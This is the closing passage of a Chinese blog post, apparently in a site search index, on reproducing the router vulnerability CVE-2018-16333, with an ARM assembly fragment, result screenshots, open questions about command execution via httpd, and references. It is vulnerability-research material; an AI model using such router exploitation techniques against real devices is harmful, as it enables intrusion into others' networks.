class="hljs-built_in">PC</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">R11</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">R5</span><br><span class="hljs-keyword">POP</span> <span class="hljs-built_in">R4</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/22.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/23.png" alt="image"></p><ul><li>运行结果</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/24.png" alt="image"></p><h2 id="0x6-疑惑"><a href="#0x6-疑惑" class="headerlink" title="0x6 疑惑"></a>0x6 疑惑</h2><ul><li>使用<code>httpd</code>中的<code>doSystemCmd</code>函数执行命令为什么不成功？</li><li>为什么第2次访问URL才能触发<code>form_fast_setting_wifi_set</code>函数？</li></ul><h2 id="0x7-Reference"><a href="#0x7-Reference" class="headerlink" title="0x7 Reference"></a>0x7 Reference</h2><ul><li><a href="https://www.anquanke.com/post/id/231445">https://www.anquanke.com/post/id/231445</a></li><li><a href="https://www.zmyth.me/Arm%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%B0%83%E7%94%A8%E6%A0%88%E5%9B%9E%E6%BA%AF/">https://www.zmyth.me/Arm%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%B0%83%E7%94%A8%E6%A0%88%E5%9B%9E%E6%BA%AF/</a></li><li><a href="https://cq674350529.github.io/2020/05/09/%E6%8A%80%E5%B7%A7misc/">https://cq674350529.github.io/2020/05/09/%E6%8A%80%E5%B7%A7misc/</a></li><li><a href="https://blog.csdn.net/richard1230/article/details/81159316">https://blog.csdn.net/richard1230/article/details/81159316</a></li><li><a href="https://xz.aliyun.com/t/7357">https://xz.aliyun.com/t/7357</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>IoT-Sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Router</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
